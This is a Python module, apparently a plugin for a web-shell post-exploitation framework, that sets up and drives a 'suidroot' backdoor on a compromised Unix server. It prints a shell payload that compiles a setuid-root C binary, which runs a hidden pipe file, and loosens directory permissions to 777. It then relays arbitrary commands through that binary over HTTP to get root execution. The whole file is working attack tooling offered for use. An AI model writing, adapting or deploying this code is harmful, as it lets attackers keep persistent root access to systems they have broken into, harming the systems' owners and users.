
api.isshell()

if api.server['platform'] == 'win':
    api.exit(P_err+self.name+': Only available on unix systems')

if self.argc < 2:
    api.exit(self.help)


if self.argv[1] == 'generate':
    if self.argc != 3: api.exit(self.help)
    suidFile = rpath.abspath(self.argv[2])
    suidDir  = rpath.dirname(suidFile)
    pipe     = suidDir+'/.x.x.x'
    print 'To activate the rootsuid backdoor, execute this payload AS ROOT on the remote system:'

    backdoor = 'main(){setuid(0);system("%s");}' % pipe
    payload  = "chmod -R 777 %d;echo -e '%b'>%f;gcc -x c -o %f %f;chown root %f;chmod 4777 %f"
    payload = payload.replace('%b',backdoor)
    payload = payload.replace('%f',suidFile)
    payload = payload.replace('%d',suidDir)
    print P_NL+color(34)+payload+color(0)+P_NL

    if not reply.isyes('Was the payload executed ?'): api.exit(P_err+self.name+': Payload generation aborted')
    http.send({'BACKDOOR' : suidFile},'checker')
    if http.error: api.exit(P_err+self.name+': %s: Is not a valid suidroot backdoor' % suidFile)

    if 'SUIDROOT_BACKDOOR' not in api.env:
        api.env['SUIDROOT_BACKDOOR'] = ''
    if suidFile != api.env['SUIDROOT_BACKDOOR']:
        try: del api.env['SUIDROOT_BACKDOOR']
        except: pass
        api.env['SUIDROOT_BACKDOOR'] = suidFile
        api.env['SUIDROOT_CWD']      = rpath.cwd
        api.env['SUIDROOT_PIPE']     = pipe
    api.exit(P_inf+'The suidroot exploit is now available !')

if not 'SUIDROOT_BACKDOOR' in api.env:
    api.exit(P_err+"Suidroot exploit not activated, use the 'generate' argument")

command = 'cd '+api.env['SUIDROOT_CWD']+'\n'
command+= (' '.join(self.argv[1:]))+'\n'
command+= 'echo suid `pwd` suid\n'

query = {'BACKDOOR' : api.env['SUIDROOT_BACKDOOR'],
         'PIPE'     : api.env['SUIDROOT_PIPE'],
         'COMMAND'  : command}

http.send(query)

if http.error: api.exit(http.error)

response = http.response.splitlines()
if not response: api.exit('')
newpwd = response[-1]
response = P_NL.join(response[:-1])
err = P_err+self.name+': Fatal error'
if not newpwd.startswith('suid '): api.exit(err)
if not newpwd.endswith('suid'): api.exit(err)
newpwd = newpwd[5:-5]
if not rpath.isabs(newpwd): api.exit(err)

api.env['SUIDROOT_CWD'] = newpwd
print response
